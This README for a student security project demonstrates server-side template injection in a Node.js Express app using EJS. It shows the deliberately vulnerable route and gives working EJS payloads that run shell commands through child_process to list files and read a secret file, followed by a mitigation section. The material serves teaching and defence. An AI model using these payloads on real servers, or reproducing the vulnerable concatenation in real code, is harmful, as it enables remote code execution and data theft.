````markdown
# Server-Side Template Injection (SSTI) Vulnerability Demo

This project is a demonstration of a **Server-Side Template Injection (SSTI)** vulnerability using a simple Node.js web application built with the **Express** framework and the **EJS** templating engine.



## 👥 Project Team Members (Group - 05)

| Name | ID |
| :--- | :--- |
| Challa chanikya | 2023IMG-015 |
| santhosh karne | 2023IMG-027 |
| Srikar vollala | 2023IMG-058 |
| Kundan Meena | 2023IMT-047 |



## 🎯 Project Goal and Vulnerability

The primary goal of this project is to illustrate how an SSTI vulnerability occurs when **unsanitized user input** is dynamically rendered as a **template string**. We will demonstrate how an attacker can exploit this flaw to achieve **Remote Code Execution (RCE)** on the server.

The vulnerable code snippet in `app.js` at the `/welcome` GET route is where the user-supplied `username` is concatenated directly into a template string and then executed by `ejs.render()`:

```javascript
app.get('/welcome', (req, res) => {
  const username = req.query.username || 'Guest';
  const template = '<h1>Hello, ' + username + '!</h1><a href="/">Go Back</a>';
  
  try {
    const html = ejs.render(template); // Vulnerable point: ejs.render() executes the concatenated template string
    res.send(html);
  } catch (err) {
    // ... error handling
  }
});
````

-----

## 🛠️ Installation and Setup

### Prerequisites

To run this demonstration, you need:

  * **Node.js** (version 10 or later is recommended).
  * **npm** (Node Package Manager).

### Setup Steps

1.  **Clone or Download** the project files.
2.  **Install Dependencies:** Navigate to the project directory and install the required Node.js packages (`ejs`, `escape-html`, `express`).
    ```bash
    npm install
    ```
3.  **Start the Server:** Run the main application file using the start script defined in `package.json`.
    ```bash
    npm start
    # or
    node app.js
    ```
    The console should output: `Server running on http://localhost:3000` and `🔓 SSTI Vulnerability Demo Active`.
4.  **Access the Application:** Open your web browser and navigate to `http://localhost:3000`.

-----

## 💣 Demonstration: SSTI leading to RCE

The following steps demonstrate how to exploit the SSTI vulnerability to read the secret file: `secret/pass.txt`.

### Step 1: Confirming Vulnerability (Template Execution)

1.  On the main page (`http://localhost:3000`), enter any name (e.g., `test`) and click **Submit**.
2.  You will be redirected to the vulnerable endpoint: `http://localhost:3000/welcome?username=test`.
3.  Modify the `username` parameter in the URL with a simple EJS payload to confirm execution:
    ```
    http://localhost:3000/welcome?username=<%= 2*2 %>
    ```
4.  **Expected Output:** The page should display **Hello, 4\!**. This confirms the template engine is evaluating the injected expression.

### Step 2: Listing Server Directories

We use a Remote Code Execution (RCE) payload, as detailed in the presentation, to list the files using the `child_process` module in Node.js.

  * **Payload (Raw EJS):**
    ```ejs
    <% var output = global.process.mainModule.require('child_process').execSync('powershell ls -Name').toString(); %> <%= output %>
    ```
  * **Action:** URL-encode the raw payload above and insert it as the `username` parameter in the URL.

### Step 3: Reading the Secret File

After listing the directories and finding the `secret` folder, we can access the sensitive file **pass.txt** within it.

  * **Payload (Raw EJS to read `pass.txt`):**
    ```ejs
    <% var output = global.process.mainModule.require('child_process').execSync('cd secret && powershell cat pass.txt').toString(); %> <%= output %>
    ```
  * **Action:** URL-encode and insert this payload into the URL.
  * **Result:** The server executes the command and displays the secret content: **we love ISSC\!**.

-----

## 🛡️ Mitigation

The core issue is allowing raw user input to be concatenated into a string that is then parsed and executed as a template.

### Recommended Fix

The correct mitigation involves two steps:

1.  **Sanitize Input:** Use the `escape-html` library to sanitize the user input, which converts special template characters (like `<` and `>`) into HTML entities (`&lt;` and `&gt;`).
2.  **Use Safe APIs:** Utilize EJS's built-in safe file rendering function (`res.render`) which automatically applies escaping for output variables (`<%= username %>`) when a proper EJS template file (`views/welcome.ejs`) is used.

The commented-out code block in `app.js` demonstrates the secure, mitigated implementation:

```javascript
// app.get('/welcome', (req, res) => {
//   const username = escape(req.query.username) || 'Guest'; // Step 1: Sanitize input with escape-html
//   try {
//     res.render('welcome', { username }); // Step 2: Use res.render with a static template file
//   } catch (err) {
//     res.status(500).send(`<h1>Error</h1><pre>${err.message}</pre><a href="/">Go Back</a>`);
//   }
// });
```

```
```
